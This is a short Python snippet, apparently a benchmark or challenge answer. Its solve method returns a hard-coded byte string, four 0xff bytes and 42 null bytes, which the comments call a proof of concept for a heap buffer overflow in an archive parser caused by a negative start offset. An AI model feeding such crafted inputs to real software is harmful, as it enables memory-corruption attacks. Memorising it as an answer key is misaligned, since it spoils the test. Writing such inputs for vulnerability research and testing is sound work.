class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC to trigger negative archive start offset leading to heap buffer overflow
        # Based on malformed header causing invalid signed offset parsing
        poc = b'\xff\xff\xff\xff' + b'\x00' * 42
        return poc
